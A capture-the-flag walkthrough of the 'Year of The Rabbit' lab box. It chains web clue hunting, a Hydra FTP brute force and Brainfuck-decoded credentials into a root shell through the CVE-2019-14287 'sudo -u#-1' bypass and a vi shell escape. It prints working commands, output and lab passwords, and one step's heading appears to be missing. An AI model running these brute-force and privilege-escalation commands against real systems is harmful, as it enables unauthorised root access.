Year of The Rabbit: a chain of hidden paths to a sudo UID bypass

Nothing on this box is reachable directly, every stage hides behind the last: a comment in a stylesheet, a redirect parameter, strings embedded in an image, text run through an esoteric programming language instead of a cipher. The final step is a sudo bug with an actual CVE name.

Room: Year of The Rabbit Category: Web / Linux Privesc Tools: Dirbuster, Hydra, Burp Suite

The setup: a web server hiding a trail of nested secrets, each one found inside the last. The job: follow every hidden path to a foothold, then escalate through a known sudo vulnerability to root.

Flags are omitted below, as always, the chain itself is the point.

The Investigation

1
Climb a chain of hidden paths

A service scan shows the usual trio, FTP, SSH, and a web server:

21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

A directory brute force finds /assets, and viewing its source rather than just its rendered page pays off immediately, a comment left inside a stylesheet:

* {
  margin: 0px 0px 0px 0px;
  padding: 0px 0px 0px 0px;
}

/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php */

Requesting that page in Burp Suite shows a 302 redirect carrying its own hidden value in the Location header:

GET /sup3r_s3cr3t_fl4g.php HTTP/1.1
Host: 10.10.77.215

HTTP/1.1 302 Found
Date: Sun, 01 Aug 2021 23:51:20 GMT
Server: Apache/2.4.10 (Debian)
Location: intermediary.php?hidden_directory=/WExYY2Cv-qU

Visiting that directory lists a single file, downloaded directly:

Index of /WExYY2Cv-qU
Name              Last modified          Size
Hot_Babe.png      2020-01-23 00:34       464K

$ curl "http://10.10.77.215/WExYY2Cv-qU/Hot_Babe.png" --output hotbabe.png
Why this works

Source code, response headers, and redirect targets all carry information a rendered page never shows. Three completely different hiding spots, a code comment, an HTTP header, a directory listing, each only gave something up because they were actually inspected, not just clicked through.

Sixteen candidate passwords, saved to a file (rabbit.txt) for the next step, effectively a small wordlist embedded in an image.

Why this works

Image files routinely carry extra bytes beyond their actual pixel data, and strings doesn't care what format a file claims to be, it just reports every printable run of text it finds. A quick strings pass costs nothing and occasionally hands over exactly this.

3
Brute-force FTP with the embedded wordlist

With a username and a short, specific password list in hand, a targeted Hydra run beats guessing blind by a wide margin:

hydra ftp://10.10.77.215 -l ftpuser -P rabbit.txt

[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[21][ftp] host: 10.10.77.215   login: ftpuser   password: 5iez1wGXKfPKQ

Logging in over FTP with that password lists a single file:

$ ftp 10.10.77.215
Name (10.10.77.215:max): ftpuser
331 Please specify the password.
Password:
230 Login successful.
ftp> ls
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
Why this works

A wordlist of a dozen candidates instead of rockyou's many millions turns a brute force from "hope it finishes" into "basically instant." Finding that list was the real work, the cracking itself was almost a formality.

4
Decode a Brainfuck-encoded credentials file

The downloaded file's contents aren't a hash or a cipher, they're source code in Brainfuck, an esoteric programming language built almost entirely from eight punctuation characters:

++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+
++++[ ->---
--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[-> ++<]> +++++ +.<++
++[- >++++
+<]>+ ++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++
+++<] >+++. <++++ +++++
<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ ++++[
->++ +++++
[->++ ++++ <]>+. <+++[ ->--- <]>-- ---.- .---- .<

Running it through an online Brainfuck interpreter instead of trying to hand-trace it decodes it instantly:

User: eli
Password: DSpDiM1wAEwid
Why this works

Brainfuck isn't encryption and provides no real secrecy, it's obscurity at best. Recognizing the character set (mostly < > + - . [ ]) is the only skill needed, an interpreter does the actual work in seconds.

5
Follow a message to a hidden directory

SSHing in with the decoded credentials (eli:DSpDiM1wAEwid) surfaces a login-of-the-day message:

$ ssh eli@10.10.77.215
eli@10.10.77.215's password:

1 new message
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place.
I've left you a hidden message there"
END MESSAGE

A note from "Root" to another user mentioning a hidden location named with a leetspeak version of "secret." Searching the filesystem for exactly that finds it:

eli@year-of-the-rabbit:~$ find / -type d -name *s3cr3t* 2>/dev/null
/usr/games/s3cr3t
eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t
eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -la
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

Inside sits a single oddly-named dotfile. Reading it turns up another note from "Root", this one scolding the next user over a weak password, and naming that password directly in the text of the complaint:

eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
    -Root
Why this works

An MOTD banner is easy to skim past, but on a CTF box it's exactly the kind of place a designed clue gets planted. Following a hint instead of ignoring it as flavor text led directly to a second account's credentials.

6
Check what the next user can run as root

Switching to that account (password MniVCQVhQHUNI, straight out of Root's own complaint) and checking sudo rights shows a narrowly scoped, password-free permission:

gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt

This user can run vi on exactly one file, as any user, except root by name. Trying it as root directly confirms the restriction is actually enforced:

gwendoline@year-of-the-rabbit:~$ sudo -u root /usr/bin/vi /home/gwendoline/user.txt
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi /home/gwendoline/user.txt' as root on year-of-the-rabbit.
Why this works

vi itself is a well-known sudo privilege-escalation target: once it's running with elevated rights, its own shell-out command spawns a shell with those same rights. The !root exclusion looks like it closes that off entirely, which is exactly what makes it worth testing properly rather than taking at face value.

7
Bypass the exclusion with CVE-2019-14287

Checking the installed sudo version confirms it predates the fix for a real, named vulnerability:

sudo -V
# Sudo version 1.8.10p3

CVE-2019-14287 affects exactly this kind of !root exclusion: passing a numeric UID of -1 (or its unsigned equivalent) instead of a username causes sudo to resolve it back to UID 0, root, since the exclusion only ever matched the literal name:

gwendoline@year-of-the-rabbit:~$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

vi opens running as root. From inside it, shelling out confirms it completely:

:!/bin/bash

root@year-of-the-rabbit:/home/gwendoline# whoami
root
Why this works

This is the same class of bug as the UID-wraparound trick elsewhere in this style of misconfiguration, but here it has an actual CVE and a known-fixed version, which is why checking sudo -V before assuming a dead end is worth doing every time a username-based exclusion shows up in sudo -l.

Full Attack Chain

dirbuster: /assets found
  → CSS comment: a hidden PHP page named
       → Burp: redirect Location header leaks a hidden directory token
            → Image downloaded, strings reveals an FTP user + password list
                 → Hydra cracks FTP with that short wordlist
                      → Brainfuck-encoded file decoded: a second user's creds
                           → SSH login, MOTD hints at a hidden directory
                                → find locates it, a note leaks a third password
                                     → sudo -l: vi allowed as (ALL, !root)
                                          → CVE-2019-14287 (-u#-1): root shell via vi

Takeaways

Hidden paths live in places that aren't rendered pages

A stylesheet comment and a redirect header both carried real clues here. View-source and a proxy's raw response view matter as much as clicking through the site itself.

A narrow sudo rule still needs its version checked

(ALL, !root) looks airtight until the sudo version turns out to predate the fix for exactly the bug that breaks it. Reading sudo -l is only half the enumeration, sudo -V is the other half.

Obscurity isn't security, but it isn't nothing either

Brainfuck encoding, embedded strings, and leetspeak directory names never stopped a determined search, but each one still slowed things down by a step. None of them were a real control, all of them were worth noticing anyway.
